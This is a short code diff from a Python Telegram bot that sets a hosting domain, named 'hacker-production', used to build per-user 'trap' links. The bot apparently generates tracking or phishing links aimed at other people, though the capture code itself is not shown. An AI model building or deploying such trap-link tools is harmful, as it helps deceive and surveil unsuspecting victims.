@@ -128,7 +128,7 @@ async def generate_link(message: types.Message):
     
     if not public_domain:
         # إذا لم يتم وضعه في المتغيرات، ضع رابط مشروعك الفعلي هنا بين علامتي التنصيص بدلاً من intelligent-magic.up.railway.app مثلاً
-        public_domain = "hacker-production-xxxx.up.railway.app" 
+        public_domain = "hacker-production-3281.up.railway.app" 
 
     trap_url = f"https://{public_domain}/t/{unique_token}"
     USERS_DB[user_id]["links_generated"] += 1
